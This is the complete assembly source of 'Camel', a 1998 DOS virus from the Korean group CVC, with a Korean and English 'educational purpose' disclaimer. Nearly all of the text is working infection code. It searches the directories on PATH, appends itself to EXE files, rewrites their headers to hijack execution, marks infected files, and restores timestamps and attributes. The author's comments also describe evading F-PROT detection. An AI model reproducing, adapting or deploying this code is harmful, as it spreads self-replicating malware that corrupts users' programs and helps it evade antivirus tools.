;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;           Camel                             \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : Camel
; AV Name    : -
; Author     : ?
; Group      : CVC
; Origin     : Corea
;
; Type : Non Memory resident EXE
;
; !****************************************************************************!
; *                                                                            *
; * 경고 !                                                                     *
; *    이것은 바이러스 소스 코드이다. 교육적인 목적으로만 사용되어야한다.      *
; *    제작자는 이 소스코드로 야기되는 어떠한 문제에 대해서도 책임을 지지 않   *
; *    는다. 변형 하거나 실행하지 말라 !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
;      - 디렉토리의 이동기법을 추가했다.
;        이동하는 디렉토리는 설정되어있는 PATH에 따른다. 일단, 바이러스가 실행
;        되면 현재의 디렉토리에 있는 *.EXE파일을 감염시킨 후에 설정되어 있는 경
;        로대로 직접 이동해서 차근차근(?) 감염시킨다. 때문에 속도가 느리다.
;
;      * <경로가 설정되어 있지 않다면 현재의 디렉토리부터 루트까지 이동시키려고
;        했는데 그만 뒀다. 따라서 경로가 설정되어있지 않으면 현재의 디렉토리만
;        감염된다.>
;
;      * [버그] : 만약, 경로가 " PATH=C:\UTILITY "등과같이 하나만 지정되어 있다
;                 면 그 디렉토리는 감염시키지 못한다. "
;                 PATH=C:\UTILITY;"처럼 끝부분에 ';'이 있다면 감염시킨다.
;
;      * <M.EXE나 HWP등과 같이 감염되는 실행되지 않는 프로그램은 감염에서 제외
;        해야 하는데 그런 부분을 아직 만들지 않았다.>
;
;      * WINDOWS EXE 파일은 감염시키지 않는다.
;
;      - 중복감염을 피하기 위해서 Header의 12h(Checksum)에 'nj'라는 문자열을 넣
;        고 이것을 체크한다.
;
;      - 속성,시간,날짜를 원래대로 복구한다. 속성에 상관없이 감염.
;
;      - INT 24h를 가로채지 않았기 때문에 복사방지 탭이 붙은 플로피에서는.
;        ...흐~
;
;      - 엄청나게 조잡하고...쓸데없는 부분이 많당~. 더이상 손대기도 싫당.
;        얼마나 지저분하게 만들었는지 F-PROT 에도 검색이 안된다.
;        (TBAV에는 된당~)
;
;      - 지금 다시 만들고 있습니다. 깔끔하게요....특히 감염시키는 프로시져를...
;
;                                                 호랑나비....
;
; Heuristic Test : AVP,DrWeb,DSAV,TBAV 에서 진단
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

_size         EQU      V_end - V_start
Camel         SEGMENT
              ASSUME   CS:Camel, DS:Camel

              ORG      100h

V_start:      PUSH     DS ES

              MOV      SI,2Ch                   ; 환경변수가 저장되어 있는 주소를
              MOV      AX, word ptr DS:[SI]     ;  얻는다. PSP의 2Ch에 그 주소가...

              PUSH     CS CS
              POP      DS ES

              DB       0E8h, 4, 0               ; 델타옵셋을 계산
Delta:                                          ;
              DB       4 DUP (90h)              ;-> 이부분을 지우면 F-PROT에
              POP      BP                       ;    검색된다. (왜그럴까나??)
              NOP                               ;
              SUB      BP, offset Delta         ;

              PUSH     AX                       ;

              MOV      AH,19h                   ; 현재의 드라이브를 구한다.
              INT      21h                      ;
              MOV      byte ptr oDrive[BP],AL   ;

              MOV      AH,47h                   ; 현재의 디렉토리를 구한다.
              XOR      DL,DL                    ;
              LEA      SI, oDIR[BP+1]           ;
              INT      21h                      ;
              MOV      byte ptr oDIR[BP],'\'    ;

                                                ; 경로를 저장하는 부분.
              POP      ES                       ;  맘에 안든다.
              XOR      SI,SI                    ;
              MOV      CX,512                   ;
get_path:     CMP      word ptr ES:[SI], 'AP'   ;
              JZ       ok_001                   ;
not_:         INC      SI                       ;
              LOOP     get_path                 ;
              MOV      found_path[BP],0         ;
              JMP      end_path                 ;
ok_001:       CMP      word ptr ES:[SI+2], 'HT' ;
              JZ       ok_002                   ;
              JMP      not_                     ;
ok_002:       CMP      byte ptr ES:[SI+4], '='  ;
              JZ       ok_003                   ;
              JMP      not_                     ;
ok_003:                                         ;
              ADD      SI,+5                    ;
              XOR      DI,DI                    ;
              CMP      byte ptr ES:[SI],0
              JNZ      save_PATH
              MOV      found_PATH[BP],0
              JMP      end_path
save_PATH:    MOV      found_PATH[BP],1
Loop_path:    MOV      AL, byte ptr ES:[SI]     ;
              INC      SI                       ;
              CMP      AL,0                     ;
              JZ       end_path                 ;
              MOV      thePATH[BP+DI],AL        ;
              INC      DI                       ;
              JMP      Loop_path                ;
end_path:
              PUSH     DS                       ;
              POP      ES                       ;

              LEA      SI, oIP[BP]              ; 변수를 다시 설정한다.
              LEA      DI, _IP[BP]              ; 끝에 0EAh와 함께 점프명령을 완성.
              MOV      CX,4                     ;
          rep MOVSW                             ;

              MOV      AH,1Ah                   ; DTA를 설정한당.
              LEA      DX, DTA[BP]              ;
              INT      21h                      ;
;------------------------------------------------------------------------;
              CALL     INFECT                   ; 현재 디렉토리를 감염

              CMP      found_path[BP],1         ; 설정된 경로를 찾았는지의 여부를
              JNZ      Chg_path_2               ;  검사.

Chg_path_1:   XOR      SI,SI                    ; <경로를 찾았을 때의 루틴>
              LEA      DI,path_START[BP]        ;
              MOV      byte ptr path_CNT[BP],1  ;  각각의 것들은 ';'으로 구분되니까
              MOV      AX,SI                    ;   그 부분을 0으로 대치한다.
              STOSB                             ;    (아스키즈 형식으로 고치려니..)
                                                ;
divide_path:  INC      SI                       ;  글구 ';'다음의 옵셋을 차곡차곡
              CMP      byte ptr thePATH[BP+SI],';'             ;   저장한다. (그부분이 옮길 디렉토
              JNZ      path_001                 ;    리의 시작 주소가 되니까..)
              MOV      byte ptr thePATH[BP+SI],0;
              MOV      AX,SI                    ;  암튼 문제점이 많은 부분이당.
              INC      AX                       ;
              STOSB                             ;
              INC      byte ptr path_CNT[BP]    ;
              JMP      divide_path              ;
                                                ;
path_001:     CMP      byte ptr thePATH[BP+SI],0;
              JNZ      path_002                 ;
              JMP      complete                 ;
path_002:     JMP      divide_path              ;


complete:     MOV      CL, byte ptr path_CNT[BP]
              XOR      CH,CH

              LEA      SI, path_START[BP]
Chg_again:    LODSB
              XOR      AH,AH
              MOV      DI,AX

              LEA      DX, thePATH[BP+DI]

              CALL     Chg_dir                  ; 디렉토리를 변경한다.
              JNC      sub_inf
              JMP      the_next

sub_inf:      CALL     INFECT                   ; 감염시킨다.

the_next:     LOOP     Chg_again

              MOV      DL, byte ptr oDrive[BP]  ; 원래의 드라이브/디렉토리로...
              XOR      DH,DH                    ;
              CALL     Chg_Drv                  ;
                                                ;
              LEA      DX, oDir[BP]             ;
              CALL     Chg_dir                  ;

Chg_path_2:                                     ; 현재의 디렉토리부터 ROOT까지
                                                ; 이동시키면서 감염시키는 부분을
                                                ; 만들려고 했는데......

;========= pass control to the host             ; 프로그램의 제어를 호스트에게...

              POP      ES DS                    ;

              MOV      AH,1Ah                   ;
              MOV      DX,80h                   ;
              INT      21h                      ;

              PUSH     DS                       ;
              POP      ES                       ;

              MOV      AX,ES                    ;
              ADD      AX,10h                   ;

              ADD      word ptr cs:_CS[BP],AX   ;

              ADD      word ptr cs:_SS[BP],AX
              MOV      SS,AX
              MOV      SP, word ptr cs:_SP[BP]
                                                ; 점프명령이당, (FAR)
              DB       0EAh

_IP           DW       ?
_CS           DW       ?
_SS           DW       ?
_SP           DW       ?

oIP           DW       ?
oCS           DW       0FFF0h
oSS           DW       0FFF0h
oSP           DW       ?

Target_01     DB       '*.E?E',0

Chg_drv       PROC
              PUSH     AX DX
              MOV      AH,0Eh
              INT      21h
              POP      DX AX
              RET
Chg_drv       ENDP

;*---------
Chg_dir       PROC
              PUSH     AX DX
              MOV      AH,3Bh
              INT      21h
              POP      DX AX
              RET
Chg_dir       ENDP

;************************************************************************
INFECT        PROC                              ; 가장 맘에 안드는 부분...         ;*
              PUSH     AX
              PUSH     BX
              PUSH     CX
              PUSH     DX
              PUSH     SI
              PUSH     DI
              PUSH     SP
              PUSH     BP
              PUSH     DS
              PUSH     ES
              PUSH     SS

Search_file:  MOV      AH,4Eh                   ;    파일 찾기.
              MOV      CX,27h                   ;
              LEA      DX, Target_01[BP]        ;
              INT      21h                      ;

              JNC      pass_001                 ;                                  ;*
              JMP      end_inf                  ;                                  ;*
                                                                                   ;*
pass_001:     LEA      SI, DTA[BP+15h]          ; 속성/시간/날짜를 저장.
              LEA      DI, Attr[BP]             ;
              MOVSB                             ;
              MOVSW                             ;
              MOVSW                             ;

              MOV      AX,4301h                 ; 속성 해제.
              XOR      CX,CX                    ;
              LEA      DX, DTA[BP+1Eh]          ;
              INT      21h                      ;
                                                                                   ;*
              MOV      AX,3D02h                 ; 오픈
              LEA      DX, DTA[BP+1Eh]          ;
              INT      21h                      ;
              XCHG     AX,BX                    ;

              MOV      AH,3Fh                   ; 해더를 읽는다.
              MOV      CX,1Ah                   ;
              LEA      DX, Header[BP]           ;
              INT      21h                      ;
                                                                                   ;*
              CMP      word ptr Header[BP],'ZM' ; 진짜 EXE파일인지를 검사하는 부분.
              JZ       pass_002                 ;  (EXE파일은 MZ로 시작한다. ZM도 있
              CMP      word ptr Header[BP],'MZ' ; 다고 하는데..못봤다)
              JZ       pass_002                 ;
              JMP      next                     ;

pass_002:     CMP      word ptr Header[BP+12h],'nj'            ; 이미 감염된 파일인지를 검사....
              JNE      pass_003                 ;
              JMP      next                     ;

pass_003:     CMP      byte ptr Header[BP+18h],'@'             ; 해더의 18h에 골뱅이(@)가 있는 건
              JNE      no_win                   ;  윈도우 파일이당.
              JMP      next                     ;
                                                ; 해더의 일부분(SS/SP/IP/CS)를 저장.
no_win:       LEA      SI, Header[BP+0Eh]       ;
              LEA      DI, oSS[BP]              ;
              MOVSW                             ;
              MOVSW                             ;
              LEA      SI, Header[BP+14h]       ;
              LEA      DI, oIP[BP]              ;
              MOVSW                             ;
              MOVSW                             ;

              MOV      AX,4202h                 ; 포인터를 끝으로 이동
              XOR      CX,CX                    ;
              MOV      DX,CX                    ;
              INT      21h                      ;
              PUSH     DX AX BX                 ; 파일의 크기 및 핸들을 저장

pass_004:                                       ; 새로운 CS,IP값을 계산한다.
              MOV      BX, word ptr Header[BP+08h]             ;-> 해더의 크기를 구한다(패러그래프)

              MOV      CL,4                     ;-> 구한 해더의 크기를 바이트로
              SHL      BX,CL                    ;   바꾼다. (패러그래프는 16byte)

              SUB      AX,BX                    ;-> 파일의 크기에서 해더의 크기를
              SBB      DX,0                     ;   뺀다.

              MOV      CX,16                    ;* 이제 이것을 다시 패러그래프 형식
              DIV      CX                       ;  으로 바꾼다. 아까랑 반대루 16으로
                                                ;  나누면 된다.
              MOV      word ptr Header[BP+0Eh], AX             ; SS
              MOV      word ptr Header[BP+10h], 0FFFEh         ; SP
              MOV      word ptr Header[BP+14h], DX             ; IP
              MOV      word ptr Header[BP+16h], AX             ; CS
              MOV      word ptr Header[BP+12h], 'nj'           ; Checksum에 nj를 넣는다.(중복감염을
                                                ; 피하기 위해서..)
pass_005:     POP      BX AX DX                 ; 파일의 크기 및 핸들을 다시 복구.

pass_006:                                       ; < 페이지와 나머지 바이트(?) 계산 >- EXE파일의 해더의 02h와 04h로 파일의 크기를 알 수 있다.
              ADD      AX, _size                ;1. 파일의 크기에 바이러스의 크기를
              ADC      DX,0                     ;   더한다.

              MOV      CX,512                   ;2. 그 값을 512로 나눈다.(페이지는 하
              DIV      CX                       ;   나당 512바이트)

              OR       DX,DX                    ;3. 나머지가 0이 아니라면 페이지를 반
              JE       no_inc                   ;   올림 해야 한당. 그래서 1을 증가.
              INC      AX                       ;
no_inc:
              MOV      word ptr Header[BP+04h],AX              ;4. 페이지는 해더의 04h에
              MOV      word ptr Header[BP+02h],DX              ;5. 마지막 페이지의 나머지 바이트 값은e.
                                                               ;   02h에 넣는다.
pass_007:     MOV      AH,40h                   ; 바이러스를 쓴다.
              MOV      CX, _size                ;
              LEA      DX, V_start[BP]          ;
              INT      21h                      ;

              MOV      AX,4200h                 ; 파일 포인터를 처음으로 이동
              XOR      CX,CX                    ;
              MOV      DX,CX                    ;
              INT      21h                      ;

              MOV      AH,40h                   ; 여태..수정해 놓은 해더를 쓴다.
              MOV      CX,1Ah                   ;
              LEA      DX, Header[BP]           ;
              INT      21h                      ;

              MOV      CX, Time[BP]             ; 시간/날짜의 복구
              MOV      DX, Date[BP]             ;
              MOV      AX,5701h                 ;
              INT      21h                      ;
                                                                                   ;*
next:         MOV      AH,3Eh                   ; 닫기
              INT      21h                      ;
                                                                                   ;*
              MOV      AX,4301h                 ; 속성 복구
              XOR      CH,CH                    ;
              MOV      CL, Attr[BP]             ;
              LEA      DX, DTA[BP+1Eh]          ;
              INT      21h                      ;
                                                                                   ;*
              MOV      AH,4Fh                   ; 다음파일을 찾는다.               ;*
              INT      21h                      ;                                  ;*
              JC       end_inf                  ;                                  ;*
              JMP      pass_001

end_inf:      POP      SS
              POP      ES
              POP      DS
              POP      BP
              POP      SP
              POP      DI
              POP      SI
              POP      DX
              POP      CX
              POP      BX
              POP      AX

              ret                                                                                 ;*
INFECT        ENDP                                                                                ;*
;******************************************************************************
V_end:

oDrive        DB       ?
oDir          DB       ?
              DB       63 DUP (?)

Attr          DB       ?
Time          DW       ?
Date          DW       ?

found_path    DB       0

thePATH       DB       384 DUP (?)

path_CNT      DB       ?
path_START    DB       20 DUP (?)

Header        DB       1Ah DUP (?)
DTA:

Camel         ENDS
              END      V_start
